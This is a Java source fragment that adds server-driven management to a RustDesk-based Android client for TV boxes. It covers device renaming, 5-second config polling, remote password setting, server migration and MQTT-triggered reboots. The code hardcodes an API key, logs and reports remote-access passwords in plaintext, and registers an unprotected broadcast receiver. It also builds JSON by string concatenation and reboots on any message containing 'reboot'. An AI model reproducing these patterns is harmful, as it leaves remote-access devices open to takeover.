            Log.i(TAG, "Permanent password successfully updated and persisted on disk.");
            new Thread(new ReportPasswordTask(newPass)).start();

        } catch (Throwable t) {
            Log.e(TAG, "savePermanentPassword error: ", t);
        }
    }

    static class ShowRenameDialogTask implements Runnable {
        private final Context context;

        ShowRenameDialogTask(Context context) {
            this.context = context;
        }

        @Override
        public void run() {
            buildAndShowRenameDialog(context);
        }
    }

    public static void showRenameDialog(final Context context) {
        if (context == null) return;
        Context target = context;
        if (!(target instanceof Activity)) {
            if (currentActivity != null && !currentActivity.isFinishing()) {
                target = currentActivity;
            } else {
                try {
                    Intent it = new Intent(context, Class.forName("com.carriez.flutter_hbb.MainActivity"));
                    it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                    it.putExtra("SHOW_RENAME_DIALOG", true);
                    context.startActivity(it);
                    return;
                } catch (Throwable ignored) {}
            }
        }
        final Context finalCtx = target;
        new Handler(Looper.getMainLooper()).post(new ShowRenameDialogTask(finalCtx));
    }

    static class SaveNameClickListener implements DialogInterface.OnClickListener {
        private final Context context;
        private final EditText nameInput;

        SaveNameClickListener(Context context, EditText nameInput) {
            this.context = context;
            this.nameInput = nameInput;
        }

        @Override
        public void onClick(DialogInterface dialog, int which) {
            final String newName = nameInput.getText().toString().trim();
            if (!newName.isEmpty()) {
                new Thread(new SendRenameTask(context, newName)).start();
            }
        }
    }

    private static void buildAndShowRenameDialog(final Context context) {
        try {
            AlertDialog.Builder builder = new AlertDialog.Builder(context, android.R.style.Theme_DeviceDefault_Light_Dialog_Alert);
            builder.setTitle("✏️ Rename Device");

            LinearLayout layout = new LinearLayout(context);
            layout.setOrientation(LinearLayout.VERTICAL);
            layout.setPadding(40, 20, 40, 10);

            TextView label = new TextView(context);
            label.setText("Enter friendly name for this TV Box:");
            label.setTextSize(14f);
            label.setTextColor(0xFF333333);
            layout.addView(label);

            final EditText nameInput = new EditText(context);
            nameInput.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT
            ));
            nameInput.setHint("e.g. Living Room TV Box");
            if (!currentDeviceName.isEmpty()) {
                nameInput.setText(currentDeviceName);
                nameInput.setSelection(currentDeviceName.length());
            }
            nameInput.setTextSize(16f);
            layout.addView(nameInput);

            builder.setView(layout);
            builder.setPositiveButton("Save", new SaveNameClickListener(context, nameInput));
            builder.setNegativeButton("Cancel", null);

            AlertDialog dlg = builder.create();
            dlg.show();
        } catch (Throwable t) {
            Log.e(TAG, "buildAndShowRenameDialog error: ", t);
        }
    }

    static class RenameToastTask implements Runnable {
        private final Context context;
        private final String newName;

        RenameToastTask(Context context, String newName) {
            this.context = context;
            this.newName = newName;
        }

        @Override
        public void run() {
            currentDeviceName = newName;
            Toast.makeText(context, "Device name saved: " + newName, Toast.LENGTH_SHORT).show();
            try {
                if (currentActivity != null) {
                    Button btn = currentActivity.findViewById(RENAME_BTN_ID);
                    if (btn != null) {
                        btn.setText("✏️ " + newName);
                    }
                }
            } catch (Throwable ignored) {}
        }
    }

    static class SendRenameTask implements Runnable {
        private final Context context;
        private final String newName;

        SendRenameTask(Context context, String newName) {
            this.context = context;
            this.newName = newName;
        }

        @Override
        public void run() {
            try {
                File appFlutterDir = new File("/data/user/0/com.carriez.flutter_hbb/app_flutter");
                File toml1 = new File(appFlutterDir, "RustDesk.toml");
                String deviceId = ConfigManager.extractTomlValue(ConfigManager.readFile(toml1), "id");
                if (deviceId == null || deviceId.isEmpty()) {
                    deviceId = "404156725";
                }

                String urlStr = ConfigManager.getApiUrl("/api/device/rename/");
                java.util.Map<String, String> headers = new java.util.HashMap<>();
                headers.put("Content-Type", "application/json; charset=utf-8");
                headers.put("X-Ninja-Api-Key", "ninja-local-dev-key");
                String jsonPayload = "{\"id\":\"" + deviceId + "\",\"name\":\"" + newName + "\"}";
                ConfigManager.HttpResponse resp = ConfigManager.httpRequest("POST", urlStr, jsonPayload, headers);
                Log.i(TAG, "sendRenameToServer response code: " + resp.statusCode);

                new Handler(Looper.getMainLooper()).post(new RenameToastTask(context, newName));
            } catch (Throwable t) {
                Log.e(TAG, "SendRenameTask error: ", t);
            }
        }
    }

    static class CommandReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context ctx, Intent intent) {
            if (intent == null || intent.getAction() == null) return;
            String action = intent.getAction();
            if ("com.carriez.flutter_hbb.SHOW_PASSWORD_DIALOG".equals(action)) {
                showPasswordDialogWithEye(currentActivity != null ? currentActivity : ctx);
            } else if ("com.carriez.flutter_hbb.RENAME_DEVICE".equals(action)) {
                showRenameDialog(currentActivity != null ? currentActivity : ctx);
            } else if ("com.carriez.flutter_hbb.RETURN_HOME".equals(action)) {
                returnToHomeLauncher();
            } else if ("com.carriez.flutter_hbb.REBOOT_DEVICE".equals(action)) {
                Log.i(TAG, "REBOOT_DEVICE broadcast action received");
                showRebootNotificationAndRestart(ctx);
            }
        }
    }

    public static void registerCommandReceiver(Context context) {
        if (receiverRegistered || context == null) return;
        try {
            CommandReceiver receiver = new CommandReceiver();
            IntentFilter filter = new IntentFilter();
            filter.addAction("com.carriez.flutter_hbb.SHOW_PASSWORD_DIALOG");
            filter.addAction("com.carriez.flutter_hbb.RENAME_DEVICE");
            filter.addAction("com.carriez.flutter_hbb.RETURN_HOME");
            filter.addAction("com.carriez.flutter_hbb.REBOOT_DEVICE");
            context.getApplicationContext().registerReceiver(receiver, filter);
            receiverRegistered = true;
            Log.i(TAG, "Command BroadcastReceiver registered successfully!");
        } catch (Throwable t) {
            Log.w(TAG, "registerCommandReceiver error: ", t);
        }
    }

    static class ConfigSyncTask implements Runnable {
        private final Context context;

        ConfigSyncTask(Context context) {
            this.context = context;
        }

        @Override
        public void run() {
            int pollCounter = 0;
            while (true) {
                try {
                    Thread.sleep(5000); // 5 seconds fast poll for instant, responsive config synchronization
                    pollCounter++;
                    ensureRustDeskServiceStarted();
                    String deviceId = ConfigManager.getDeviceId(context);

                    int currentVer = ConfigManager.getConfigVersion(context);
                    String modelParam = "";
                    try {
                        modelParam = "&model=" + java.net.URLEncoder.encode(android.os.Build.MODEL, "UTF-8");
                    } catch (Throwable ignored) {}

                    boolean srvActive = isRustDeskCoreServiceActive(context);
                    String srvParam = "&service_running=" + (srvActive ? "1" : "0");

                    java.util.Map<String, String> headers = new java.util.HashMap<>();
                    headers.put("X-Ninja-Api-Key", "ninja-local-dev-key");

                    boolean foundPending = false;
                    boolean primaryReachable = false;

                    // 1. Primary check: poll currently active API_HOST
                    if ("127.0.0.1".equals(ConfigManager.API_HOST) || "localhost".equalsIgnoreCase(ConfigManager.API_HOST) || "0.0.0.0".equals(ConfigManager.API_HOST)) {
                        String cand = ConfigManager.sanitizeHost(ConfigManager.SERVER_HOST);
                        if (!cand.isEmpty() && !cand.equals("127.0.0.1") && !cand.equalsIgnoreCase("localhost") && !cand.equals("0.0.0.0")) {
                            ConfigManager.API_HOST = cand;
                            boolean isPrivate = cand.startsWith("192.168.") || cand.startsWith("10.");
                            ConfigManager.API_PORT = isPrivate ? "8000" : "80";
                            Log.w(TAG, "ConfigSyncTask auto-corrected API_HOST: " + ConfigManager.getApiBaseUrl());
                        }
                    }
                    try {
                        String pollUrl = ConfigManager.getApiUrl("/api/device/config/?id=" + deviceId + "&version=" + currentVer + modelParam + srvParam);
                        ConfigManager.HttpResponse resp = ConfigManager.httpRequest("GET", pollUrl, null, headers);

                        if (resp.statusCode == 200 && resp.body != null) {
                            primaryReachable = true; // Primary server is alive and knows this device
                            String respStr = resp.body;
                            if (respStr.contains("\"reboot\":true") || respStr.contains("\"reboot\": true")) {
                                handleRemoteReboot(context, deviceId);
                            }
                            if (respStr.contains("\"pending\":true") || respStr.contains("\"pending\": true")) {
                                foundPending = true;
                                applyPendingConfig(context, deviceId, currentVer, respStr, false);
                            }
                        }
                    } catch (Throwable t) {
                        Log.d(TAG, "Active host poll note: " + t.getMessage());
                    }

                    // 2. Secondary check: ONLY poll ORIGIN server if primary server is UNREACHABLE.
                    // If primary responded HTTP 200, device is registered on primary — NEVER poll origin!
                    // This guarantees device never leaks online status back to old server once migrated.
                    // When primary IS unreachable for 3+ cycles: poll ORIGIN on fast recovery.
                    if (!foundPending
                            && !primaryReachable
                            && ConfigManager.ORIGIN_API_HOST != null
                            && !ConfigManager.ORIGIN_API_HOST.trim().isEmpty()) {
                        String currentApiHost = ConfigManager.API_HOST;
                        boolean originIsDifferent = !ConfigManager.ORIGIN_API_HOST.equalsIgnoreCase(currentApiHost);
                        if (originIsDifferent) {
                            try {
                                String originPollUrl = ConfigManager.getOriginApiUrl("/api/device/config/?id=" + deviceId + "&version=" + currentVer + modelParam + srvParam);
                                ConfigManager.HttpResponse originResp = ConfigManager.httpRequest("GET", originPollUrl, null, headers);
                                if (originResp.statusCode == 200 && originResp.body != null) {
                                    String originBody = originResp.body;
                                    if (originBody.contains("\"reboot\":true") || originBody.contains("\"reboot\": true")) {
                                        handleRemoteReboot(context, deviceId);
                                    }
                                    if (originBody.contains("\"pending\":true") || originBody.contains("\"pending\": true")) {
                                        Log.i(TAG, "ConfigSyncTask received pending update from ORIGIN server (primary unreachable): " + ConfigManager.ORIGIN_API_HOST);
                                        applyPendingConfig(context, deviceId, currentVer, originBody, true);
                                    }
                                }
                            } catch (Throwable originErr) {
                                Log.d(TAG, "Origin server poll note: " + originErr.getMessage());
                            }
                        }
                    }
                } catch (Throwable t) {
                    Log.d(TAG, "ConfigSync loop warning: " + t.getMessage());
                }
            }
        }

        static void handleRemoteReboot(final Context context, final String deviceId) {
            try {
                Log.i(TAG, "Reboot command received from NinjaDesk server for device " + deviceId);
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            String ackUrl = ConfigManager.getApiUrl("/api/device/reboot/ack/");
                            java.util.Map<String, String> ackHeaders = new java.util.HashMap<>();
                            ackHeaders.put("Content-Type", "application/json");
                            ackHeaders.put("X-Ninja-Api-Key", "ninja-local-dev-key");
                            String payload = "{\"id\":\"" + deviceId + "\"}";
                            ConfigManager.httpRequest("POST", ackUrl, payload, ackHeaders);
                            Log.i(TAG, "Reboot ACK dispatched successfully to " + ackUrl);
                        } catch (Throwable t) {
                            Log.w(TAG, "Reboot ACK dispatch note: " + t.getMessage());
                        }
                    }
                }).start();

                showRebootNotificationAndRestart(context);
            } catch (Throwable t) {
                Log.e(TAG, "handleRemoteReboot error: ", t);
            }
        }

        private static void applyPendingConfig(Context context, String deviceId, int currentVer, String respStr, boolean fromOrigin) {
            try {
                Log.i(TAG, "Processing pending server config update: " + respStr + " (fromOrigin=" + fromOrigin + ")");
                String newHost = ConfigManager.extractJsonField(respStr, "server_host");
                String newKey = ConfigManager.extractJsonField(respStr, "server_key");
                String newHbbs = ConfigManager.extractJsonField(respStr, "hbbs_port");
                String newHbbr = ConfigManager.extractJsonField(respStr, "hbbr_port");
                String newPass = ConfigManager.extractJsonField(respStr, "password");
                String verStr = ConfigManager.extractJsonField(respStr, "version");
                String apiServer = ConfigManager.extractJsonField(respStr, "api_server");

                int targetVer = currentVer + 1;
                if (verStr != null && !verStr.isEmpty()) {
                    try {
                        targetVer = Integer.parseInt(verStr.trim());
                    } catch (Throwable ignored) {}
                }

                boolean passwordApplied = false;
                if (newPass != null && !newPass.isEmpty()) {
                    Log.i(TAG, "Received dynamic password update from server: " + newPass);
                    savePermanentPassword(context, newPass);
                    passwordApplied = true;
                }

                // Intelligent API server alignment:
                String cleanNewHost = ConfigManager.sanitizeHost(newHost);
                if (apiServer == null || apiServer.trim().isEmpty() || apiServer.contains("127.0.0.1") || apiServer.contains("localhost")) {
                    if (!cleanNewHost.isEmpty() && !cleanNewHost.equals("127.0.0.1") && !cleanNewHost.equalsIgnoreCase("localhost")) {
                        boolean isPrivate = cleanNewHost.startsWith("192.168.") || cleanNewHost.startsWith("10.");
                        String portSuffix = isPrivate ? (":" + ConfigManager.API_PORT) : "";
                        apiServer = ConfigManager.API_SCHEME + "://" + cleanNewHost + portSuffix;
                        Log.i(TAG, "Derived safe apiServer: " + apiServer);
                    }
                }

                Log.i(TAG, "Migrating to server: " + newHost + ":" + newHbbs + " (target v" + targetVer + ", api=" + apiServer + ", fromOrigin=" + fromOrigin + ")");

                // 1. Send ACK via HTTP POST to the issuing server BEFORE switching API_HOST in memory!
                try {
                    String pushId = ConfigManager.extractJsonField(respStr, "push_id");
                    String ackUrlStr = fromOrigin 
                        ? ConfigManager.getOriginApiUrl("/api/device/config/ack/")
                        : ConfigManager.getApiUrl("/api/device/config/ack/");
                    java.util.Map<String, String> ackHeaders = new java.util.HashMap<>();
                    ackHeaders.put("Content-Type", "application/json");
                    ackHeaders.put("X-Ninja-Api-Key", "ninja-local-dev-key");
                    String ackPayload = "{\"id\":\"" + deviceId + "\",\"version\":" + targetVer 
                        + (pushId != null && !pushId.isEmpty() ? ",\"push_id\":\"" + pushId + "\"" : "")
                        + (passwordApplied ? ",\"password_ack\":true" : "") + "}";
                    ConfigManager.HttpResponse ackResp = ConfigManager.httpRequest("POST", ackUrlStr, ackPayload, ackHeaders);
                    Log.i(TAG, "Server config migration ACK dispatched for v" + targetVer + " to " + ackUrlStr + " (code " + ackResp.statusCode + ", passAck=" + passwordApplied + ")");
                } catch (Throwable t) {
                    Log.w(TAG, "ACK dispatch warning: " + t.getMessage());
                }

                // 2. Determine if server host, key, or ports actually changed.
                // If only a password was updated, DO NOT kill or restart the process!
                // RustDesk verifies the permanent password live from RustDesk.toml.
                boolean serverChanged = false;
                if (!cleanNewHost.isEmpty() && !cleanNewHost.equalsIgnoreCase(ConfigManager.SERVER_HOST)) {
                    serverChanged = true;
                }
                if (newKey != null && !newKey.trim().isEmpty() && !newKey.trim().equals(ConfigManager.SERVER_KEY)) {
                    serverChanged = true;
                }
                if (newHbbs != null && !newHbbs.trim().isEmpty() && !newHbbs.trim().equals(ConfigManager.HBBS_PORT)) {
                    serverChanged = true;
                }
                if (newHbbr != null && !newHbbr.trim().isEmpty() && !newHbbr.trim().equals(ConfigManager.HBBR_PORT)) {
                    serverChanged = true;
                }

                if (apiServer != null && !apiServer.trim().isEmpty()) {
                    ConfigManager.parseAndSetApiServer(apiServer.trim());
                }

                if (serverChanged && mqttClient != null) {
                    try {
                        mqttClient.stop();
                        mqttClient = null;
                        mqttStarted = false;
                        Log.i(TAG, "Disconnected old MQTT daemon prior to server migration");
                    } catch (Throwable ignored) {}
                }

                ConfigManager.applyServerConfig(context, newHost, newKey, newHbbs, newHbbr, apiServer, targetVer, serverChanged);
            } catch (Throwable t) {
                Log.e(TAG, "applyPendingConfig error: ", t);
            }
        }
    }

    private static volatile NinjaMqttClient mqttClient = null;
    private static boolean mqttStarted = false;

    static class MqttCallbackHandler implements NinjaMqttClient.MqttCallback {
        private final Context context;
        private final String deviceId;
        private final String mqttHost;
        private final int mqttPort;

        MqttCallbackHandler(Context context, String deviceId, String mqttHost, int mqttPort) {
            this.context = context;
            this.deviceId = deviceId;
            this.mqttHost = mqttHost;
            this.mqttPort = mqttPort;
        }

        @Override
        public void onConnected() {
            Log.i(TAG, "MQTT Daemon connected to broker " + mqttHost + ":" + mqttPort);
            if (mqttClient != null) {
                String cmdTopic = "ninjadesk/device/" + deviceId + "/command";
                mqttClient.subscribe(cmdTopic, 1);

                boolean srvActive = isRustDeskCoreServiceActive(context);
                String statusPayload = "{\"id\":\"" + deviceId + "\",\"online\":true,\"service_running\":" + srvActive + ",\"model\":\"" + android.os.Build.MODEL + "\"}";
                mqttClient.publish("ninjadesk/device/" + deviceId + "/status", statusPayload, 1);
            }
        }

        @Override
        public void onMessageReceived(String topic, String payload) {
            Log.i(TAG, "MQTT command received on " + topic + ": " + payload);
            handleRemoteMqttCommand(context, deviceId, topic, payload);
        }

        @Override
        public void onDisconnected() {
            Log.d(TAG, "MQTT Daemon disconnected from broker.");
        }
    }

    static class MqttDaemonTask implements Runnable {
        private final Context context;

        MqttDaemonTask(Context context) {
            this.context = context;
        }

        @Override
        public void run() {
            try {
                String deviceId = ConfigManager.getDeviceId(context);
                String mqttHost = ConfigManager.getMqttHost();
                int mqttPort = ConfigManager.getMqttPort();
                String willTopic = "ninjadesk/device/" + deviceId + "/status";
                String willPayload = "{\"id\":\"" + deviceId + "\",\"online\":false,\"service_running\":false}";

                MqttCallbackHandler handler = new MqttCallbackHandler(context, deviceId, mqttHost, mqttPort);
                mqttClient = new NinjaMqttClient(
                    mqttHost,
                    mqttPort,
                    "ninja-dev-" + deviceId,
                    willTopic,
                    willPayload,
                    handler
                );
                mqttClient.start();

                while (true) {
                    try {
                        Thread.sleep(30000);
                        if (mqttClient != null && mqttClient.isConnected()) {
                            boolean srvActive = isRustDeskCoreServiceActive(context);
                            String statusPayload = "{\"id\":\"" + deviceId + "\",\"online\":true,\"service_running\":" + srvActive + "}";
                            mqttClient.publish("ninjadesk/device/" + deviceId + "/status", statusPayload, 0);
                        }
                    } catch (InterruptedException e) {
                        break;
                    } catch (Throwable t) {
                        Log.d(TAG, "MQTT telemetry loop notice: " + t.getMessage());
                    }
                }
            } catch (Throwable t) {
                Log.e(TAG, "MqttDaemonTask error: ", t);
            }
        }
    }

    public static synchronized void startMqttDaemon(final Context context) {
        if (mqttStarted || context == null) return;
        mqttStarted = true;
        new Thread(new MqttDaemonTask(context), "NinjaMqtt-Daemon").start();
    }

    private static void handleRemoteMqttCommand(Context context, String deviceId, String topic, String payload) {
        try {
            if (payload == null) return;
            if (payload.contains("\"reboot\"") || payload.contains("reboot")) {
                Log.i(TAG, "Executing Instant Remote Reboot via MQTT command!");
                // 1. Send MQTT ACK immediately
                if (mqttClient != null && mqttClient.isConnected()) {
                    String ackPayload = "{\"id\":\"" + deviceId + "\",\"action\":\"reboot\",\"status\":\"ack\"}";
                    mqttClient.publish("ninjadesk/device/" + deviceId + "/ack", ackPayload, 1);
                }
                // 2. Dispatch notification & trigger root restart
                ConfigSyncTask.handleRemoteReboot(context, deviceId);
            }
        } catch (Throwable t) {
            Log.e(TAG, "handleRemoteMqttCommand error: ", t);
        }
    }

    public static void startConfigSyncPoller(final Context context) {
        if (context == null) return;
        startMqttDaemon(context);
        if (configSyncStarted) return;
        configSyncStarted = true;
        new Thread(new ConfigSyncTask(context)).start();
    }

    public static void onFlutterTextUpdated(Object state) {
        // No-op hook for Flutter text input
    }
}
